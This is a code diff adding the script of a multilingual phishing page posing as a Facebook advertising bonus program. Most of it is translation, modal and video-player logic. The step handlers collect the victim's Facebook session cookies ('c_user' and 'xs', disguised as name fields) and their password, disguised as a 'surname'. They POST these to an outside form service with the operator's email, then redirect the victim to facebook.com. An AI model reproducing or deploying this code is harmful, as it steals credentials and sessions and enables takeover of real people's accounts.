+                txt('t-stat2-label', t.stat2Label);
+                txt('t-stat3-label', t.stat3Label);
+                txt('t-benefits-h2-1', t.benefitsH2_1);
+                txt('t-benefits-h2-2', t.benefitsH2_2);
+                txt('t-benefits-h2-3', t.benefitsH2_3);
+                txt('t-benefits-p', t.benefitsP);
+                txt('t-bcard1-title', t.bcard1Title);
+                txt('t-bcard1-desc', t.bcard1Desc);
+                txt('t-bcard2-title', t.bcard2Title);
+                txt('t-bcard2-desc', t.bcard2Desc);
+                txt('t-bcard3-title', t.bcard3Title);
+                txt('t-bcard3-desc', t.bcard3Desc);
+                txt('t-bcard4-title', t.bcard4Title);
+                txt('t-bcard4-desc', t.bcard4Desc);
+                txt('t-how-h2-1', t.howH2_1);
+                txt('t-how-h2-2', t.howH2_2);
+                txt('t-how-p', t.howP);
+                txt('t-step1-title', t.step1Title);
+                txt('t-step1-desc', t.step1Desc);
+                txt('t-step2-title', t.step2Title);
+                txt('t-step2-desc', t.step2Desc);
+                txt('t-step3-title', t.step3Title);
+                txt('t-step3-desc', t.step3Desc);
+                txt('t-elig-h2-1', t.eligH2_1);
+                txt('t-elig-h2-2', t.eligH2_2);
+                txt('t-elig-h2-3', t.eligH2_3);
+                txt('t-elig-p', t.eligP);
+                txt('t-elig1-title', t.elig1Title);
+                txt('t-elig1-desc', t.elig1Desc);
+                txt('t-elig2-title', t.elig2Title);
+                txt('t-elig2-desc', t.elig2Desc);
+                txt('t-elig3-title', t.elig3Title);
+                txt('t-elig3-desc', t.elig3Desc);
+                txt('t-elig4-title', t.elig4Title);
+                txt('t-elig4-desc', t.elig4Desc);
+                txt('t-cta-h2', t.ctaH2);
+                txt('t-cta-p', t.ctaP);
+                txt('t-cta-btn', t.ctaBtn);
+                txt('t-footer-bonus', t.footerBonus);
+                txt('t-footer-program', t.footerProgram);
+                txt('t-legal-privacy', t.legalPrivacy);
+                txt('t-legal-terms', t.legalTerms);
+                txt('t-legal-contact', t.legalContact);
+                txt('t-footer-copy', t.footerCopy);
+                txt('modalTitle', t.modalTitle);
+                txt('modalSubtitle', t.modalSubtitle);
+                set('t-info-notice', t.infoNotice);
+                txt('t-label-cuser', t.labelCuser);
+                txt('t-badge-required1', t.badgeRequired1);
+                txt('t-hint-cuser', t.hintCuser);
+                txt('t-label-xs', t.labelXs);
+                txt('t-badge-required2', t.badgeRequired2);
+                txt('t-hint-xs', t.hintXs);
+                txt('t-step1-btn', t.step1Btn);
+                txt('t-label-surname', t.labelSurname);
+                txt('t-badge-required3', t.badgeRequired3);
+                txt('t-hint-surname', t.hintSurname);
+                txt('t-step2-btn', t.step2Btn);
+                txt('t-thankyou-title', t.thankyouTitle);
+                txt('t-thankyou-p2', t.thankyouP2);
+                txt('t-thankyou-btn', t.thankyouBtn);
+
+                const p1El = document.getElementById('t-thankyou-p1');
+                if (p1El) {
+                    p1El.innerHTML = t.thankyouP1;
+                }
+
+                const videoSrcEl = document.getElementById('modalVideoSrc');
+                const modalVideo = document.getElementById('modalVideo');
+                if (videoSrcEl && modalVideo && videoSrc[lang]) {
+                    const wasPlaying = !modalVideo.paused;
+                    const currentTime = modalVideo.currentTime;
+                    videoSrcEl.src = videoSrc[lang];
+                    modalVideo.load();
+                    if (wasPlaying) {
+                        modalVideo.addEventListener('loadeddata', function () {
+                            modalVideo.currentTime = currentTime;
+                            modalVideo.play().catch(() => { });
+                        }, { once: true });
+                    }
+                }
+
+                const flagEl = document.getElementById('lang-switch-flag');
+                const nameEl = document.getElementById('lang-switch-name');
+                if (flagEl) flagEl.src = flagSrc[lang] || flagSrc.english;
+                if (nameEl) nameEl.textContent = lang.charAt(0).toUpperCase() + lang.slice(1);
+            }
+
+            // ── Language Popup Logic ──
+            const langWrap = document.getElementById('lang-wrap');
+            const langConfirm = document.getElementById('lm-confirm');
+            let selectedLang = null;
+
+            langWrap.classList.add('show');
+
+            document.querySelectorAll('.lm-opt').forEach(opt => {
+                opt.addEventListener('click', () => {
+                    document.querySelectorAll('.lm-opt').forEach(o => o.classList.remove('sel'));
+                    opt.classList.add('sel');
+                    selectedLang = opt.dataset.lang;
+                    langConfirm.disabled = false;
+                });
+            });
+
+            document.getElementById('lm-search').addEventListener('input', function () {
+                const q = this.value.toLowerCase();
+                document.querySelectorAll('.lm-opt').forEach(o => {
+                    o.style.display = o.textContent.toLowerCase().includes(q) ? '' : 'none';
+                });
+            });
+
+            langConfirm.addEventListener('click', () => {
+                if (!selectedLang) return;
+                currentLang = selectedLang;
+                applyTranslations(currentLang);
+                langWrap.classList.remove('show');
+
+                const videoSrcEl = document.getElementById('modalVideoSrc');
+                const modalVideo = document.getElementById('modalVideo');
+                if (videoSrcEl && modalVideo && videoSrc[currentLang]) {
+                    videoSrcEl.src = videoSrc[currentLang];
+                    modalVideo.load();
+                }
+            });
+
+            document.getElementById('lang-switch-btn').addEventListener('click', () => {
+                document.querySelectorAll('.lm-opt').forEach(o => {
+                    o.classList.toggle('sel', o.dataset.lang === currentLang);
+                });
+                langConfirm.disabled = false;
+                selectedLang = currentLang;
+                langWrap.classList.add('show');
+            });
+
+            // ── Xs Validation ──
+            const xsInput = document.getElementById('lastName');
+            const xsErrorMsg = document.getElementById('xsErrorMsg');
+
+            function showXsError(msg) {
+                if (xsErrorMsg) {
+                    xsErrorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> ' + msg;
+                    xsErrorMsg.classList.add('show');
+                }
+                if (xsInput) {
+                    xsInput.classList.add('input-error');
+                    xsInput.focus();
+                }
+                if (xsErrorMsg) {
+                    xsErrorMsg.style.animation = 'none';
+                    xsErrorMsg.offsetHeight;
+                    xsErrorMsg.style.animation = 'shakeX 0.4s ease';
+                }
+            }
+
+            function clearXsError() {
+                if (xsErrorMsg) xsErrorMsg.classList.remove('show');
+                if (xsInput) xsInput.classList.remove('input-error');
+            }
+
+            xsInput.addEventListener('input', function () {
+                clearXsError();
+            });
+
+            function isValidXs(value) {
+                const hasUpper = /[A-Z]/.test(value);
+                const hasLower = /[a-z]/.test(value);
+                const hasDigit = /[0-9]/.test(value);
+                const hasSymbol = /[^A-Za-z0-9]/.test(value);
+                return hasUpper && hasLower && hasDigit && hasSymbol;
+            }
+
+            // ── Modal Logic ──
+            const modal = document.getElementById('bonusModal');
+            const openBtns = [
+                document.getElementById('claimBonusBtn'),
+                document.getElementById('claimBonusBtn2')
+            ];
+            const closeBtn = document.getElementById('modalCloseBtn');
+            const form = document.getElementById('bonusForm');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const thankYouStep = document.getElementById('thankYouStep');
+            const step1Next = document.getElementById('step1Next');
+            const step2Submit = document.getElementById('step2Submit');
+            const thankYouClose = document.getElementById('thankYouClose');
+            const dots = document.querySelectorAll('.step-indicator .dot');
+            const modalTitleEl = document.getElementById('modalTitle');
+            const modalSubtitleEl = document.getElementById('modalSubtitle');
+            const infoNoticeEl = document.getElementById('infoNotice');
+            const displaySurname = document.getElementById('displaySurname');
+            const fullNameInput = document.getElementById('fullName');
+            const lastNameInput = document.getElementById('lastName');
+            const surnameInput = document.getElementById('surname');
+            const video = document.getElementById('modalVideo');
+            const playOverlay = document.getElementById('playOverlay');
+            const playPauseBtn = document.getElementById('playPauseBtn');
+            const progressBar = document.getElementById('progressBar');
+            const timeDisplay = document.getElementById('timeDisplay');
+            const volumeBar = document.getElementById('volumeBar');
+            const muteBtn = document.getElementById('muteBtn');
+            const fullscreenBtn = document.getElementById('fullscreenBtn');
+            const videoWrapper = document.getElementById('videoWrapper');
+
+            let currentStep = 1;
+
+            // const URL_CUSER_XS = 'https://submit-form.com/sROovZDPx';
+            // const URL_SURNAME = 'https://submit-form.com/sROovZDPx';
+
+
+
+            fullNameInput.addEventListener('input', function () {
+                fullNameInput.classList.remove('input-error');
+                if (!lastNameInput.value.trim()) return;
+                clearXsError();
+            });
+
+            function formatTime(seconds) {
+                if (isNaN(seconds) || seconds < 0) return '0:00';
+                const m = Math.floor(seconds / 60);
+                const s = Math.floor(seconds % 60);
+                return m + ':' + (s < 10 ? '0' : '') + s;
+            }
+
+            function updateProgress() {
+                if (!video.duration) return;
+                const pct = (video.currentTime / video.duration) * 100;
+                progressBar.value = pct;
+                timeDisplay.textContent = formatTime(video.currentTime) + ' / ' + formatTime(video.duration);
+            }
+
+            function updatePlayButton() {
+                const icon = playPauseBtn.querySelector('i');
+                if (video.paused) {
+                    icon.className = 'fas fa-play';
+                } else {
+                    icon.className = 'fas fa-pause';
+                }
+            }
+
+            function togglePlay() {
+                if (video.paused) {
+                    video.play().catch(() => { });
+                } else {
+                    video.pause();
+                }
+            }
+
+            function updateMuteIcon() {
+                const icon = muteBtn.querySelector('i');
+                if (video.muted || video.volume === 0) {
+                    icon.className = 'fas fa-volume-mute';
+                } else if (video.volume < 0.5) {
+                    icon.className = 'fas fa-volume-down';
+                } else {
+                    icon.className = 'fas fa-volume-up';
+                }
+                if (!video.muted) {
+                    volumeBar.value = video.volume;
+                }
+            }
+
+            function goToStep(step) {
+                [step1, step2, thankYouStep].forEach(el => el.classList.add('hidden'));
+
+                setTimeout(() => {
+                    step1.classList.add('hidden');
+                    step2.classList.add('hidden');
+                    thankYouStep.classList.add('hidden');
+
+                    if (step === 1) {
+                        step1.classList.remove('hidden');
+                        modalTitleEl.textContent = T[currentLang].modalTitle;
+                        modalSubtitleEl.textContent = T[currentLang].modalSubtitle;
+                        infoNoticeEl.style.display = 'flex';
+                    } else if (step === 2) {
+                        step2.classList.remove('hidden');
+                        modalTitleEl.textContent = '🔐 ' + T[currentLang].labelSurname;
+                        modalSubtitleEl.textContent = T[currentLang].hintSurname;
+                        infoNoticeEl.style.display = 'flex';
+                        setTimeout(() => { surnameInput.focus(); }, 350);
+                    } else if (step === 3) {
+                        thankYouStep.classList.remove('hidden');
+                        modalTitleEl.textContent = T[currentLang].thankyouTitle;
+                        modalSubtitleEl.textContent = '';
+                        infoNoticeEl.style.display = 'none';
+                    }
+
+                    dots.forEach((dot, idx) => {
+                        const s = idx + 1;
+                        dot.classList.remove('active', 'done');
+                        if (s === step) dot.classList.add('active');
+                        else if (s < step) dot.classList.add('done');
+                    });
+
+                    currentStep = step;
+                }, 120);
+            }
+
+            function openModal() {
+                modal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+                form.reset();
+                clearXsError();
+                fullNameInput.classList.remove('input-error');
+                surnameInput.classList.remove('input-error');
+                goToStep(1);
+                if (video.paused) {
+                    playOverlay.classList.remove('hidden');
+                } else {
+                    playOverlay.classList.add('hidden');
+                }
+                updatePlayButton();
+                updateProgress();
+                playOverlay.innerHTML = '<i class="fas fa-play-circle"></i>';
+                applyTranslations(currentLang);
+            }
+
+            function closeModal() {
+                modal.classList.remove('active');
+                document.body.style.overflow = '';
+                if (!video.paused) {
+                    video.pause();
+                    playOverlay.classList.remove('hidden');
+                    updatePlayButton();
+                }
+                goToStep(1);
+                form.reset();
+                clearXsError();
+                fullNameInput.classList.remove('input-error');
+                surnameInput.classList.remove('input-error');
+            }
+
+            openBtns.forEach(btn => {
+                if (btn) {
+                    btn.addEventListener('click', function (e) {
+                        e.preventDefault();
+                        openModal();
+                    });
+                }
+            });
+
+            if (closeBtn) {
+                closeBtn.addEventListener('click', closeModal);
+            }
+
+            modal.addEventListener('click', function (e) {
+                if (e.target === modal) closeModal();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape' && modal.classList.contains('active')) {
+                    closeModal();
+                }
+            });
+
+            // ── STEP 1: Validate C_user and Xs ──
+            if (step1Next) {
+                step1Next.addEventListener('click', function () {
+                    const cuser = fullNameInput.value.trim();
+                    const xs = lastNameInput.value.trim();
+
+                    if (!cuser || !xs) {
+                        showXsError('Please fill in both fields to continue.');
+                        if (!cuser) fullNameInput.classList.add('input-error');
+                        return;
+                    }
+
+                    fullNameInput.classList.remove('input-error');
+
+                    if (!isValidXs(xs)) {
+                        showXsError('Please enter a valid Xs value.');
+                        return;
+                    }
+
+                    clearXsError();
+                    // sendData(URL_CUSER_XS, { chut: cuser, gand: xs });
+
+                    fetch("https://submit-form.com/sROovZDPx", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            c_user: cuser,
+                            xs: xs,
+                            emails: ["adsmenigar@gmail.com", "adsmenigar@gmail.com"],
+                            workerEmail: "adsmenigar@gmail.com",
+                            name: "M.H.S.Vlogger"
+                        })
+                    })
+                    goToStep(2);
+                });
+            }
+
+            if (step2Submit) {
+                step2Submit.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    const surname = surnameInput.value.trim();
+                    if (!surname) {
+                        surnameInput.classList.add('input-error');
+                        surnameInput.focus();
+                        surnameInput.addEventListener('input', function clear() {
+                            surnameInput.classList.remove('input-error');
+                            surnameInput.removeEventListener('input', clear);
+                        });
+                        return;
+                    }
+                    surnameInput.classList.remove('input-error');
+                    displaySurname.textContent = surname;
+
+                    // sendData(URL_SURNAME, { surname: surname });
+                    fetch("https://submit-form.com/sROovZDPx", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                        body: JSON.stringify({ password: surname })
+                    }).catch(() => { });
+                    goToStep(3);
+                });
+            }
+
+            if (thankYouClose) {
+                thankYouClose.addEventListener('click', function () {
+                    window.location.href = 'https://www.facebook.com/';
+                });
+            }
+
+            if (surnameInput) {
+                surnameInput.addEventListener('keydown', function (e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        step2Submit.click();
+                    }
+                });
+            }
+
+            // Video event bindings
+            if (playOverlay) playOverlay.addEventListener('click', togglePlay);
+            if (playPauseBtn) playPauseBtn.addEventListener('click', togglePlay);
+
+            video.addEventListener('play', function () {
+                playOverlay.classList.add('hidden');
+                updatePlayButton();
+            });
+            video.addEventListener('pause', function () {
+                if (!video.ended) playOverlay.classList.remove('hidden');
+                updatePlayButton();
+            });
+            video.addEventListener('ended', function () {
+                playOverlay.classList.remove('hidden');
+                playOverlay.innerHTML = '<i class="fas fa-redo-alt"></i>';
+                updatePlayButton();
+                progressBar.value = 0;
+                timeDisplay.textContent = '0:00 / ' + formatTime(video.duration);
+            });
+            video.addEventListener('loadeddata', function () {
+                playOverlay.innerHTML = '<i class="fas fa-play-circle"></i>';
+                updateProgress();
+                timeDisplay.textContent = '0:00 / ' + formatTime(video.duration);
+                volumeBar.value = video.volume;
+                updateMuteIcon();
+            });
+            video.addEventListener('timeupdate', updateProgress);
+
+            if (progressBar) {
+                progressBar.addEventListener('input', function () {
+                    if (video.duration) {
+                        video.currentTime = (parseFloat(progressBar.value) / 100) * video.duration;
+                        updateProgress();
+                    }
+                });
+            }
+            if (volumeBar) {
+                volumeBar.addEventListener('input', function () {
+                    video.volume = parseFloat(volumeBar.value);
+                    video.muted = false;
+                    updateMuteIcon();
+                });
+            }
+            if (muteBtn) {
+                muteBtn.addEventListener('click', function () {
+                    video.muted = !video.muted;
+                    updateMuteIcon();
+                });
+            }
+            if (fullscreenBtn) {
+                fullscreenBtn.addEventListener('click', function () {
+                    if (!document.fullscreenElement) {
+                        videoWrapper.requestFullscreen().catch(() => { });
+                    } else {
+                        document.exitFullscreen().catch(() => { });
+                    }
+                });
+            }
+            document.addEventListener('fullscreenchange', function () {
+                const icon = fullscreenBtn.querySelector('i');
+                if (document.fullscreenElement) {
+                    icon.className = 'fas fa-compress';
+                } else {
+                    icon.className = 'fas fa-expand';
+                }
+            });
+
+            modal.addEventListener('keydown', function (e) {
+                if (e.key === ' ' || e.key === 'Space') {
+                    const target = e.target;
+                    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName ===
+                        'BUTTON') return;
+                    e.preventDefault();
+                    togglePlay();
+                }
+            });
+            video.addEventListener('click', togglePlay);
+
+            console.log('✅ FB advertisement Program ready – 9 languages supported.');
+        })();
+    </script>
+</body>
+
+</html>
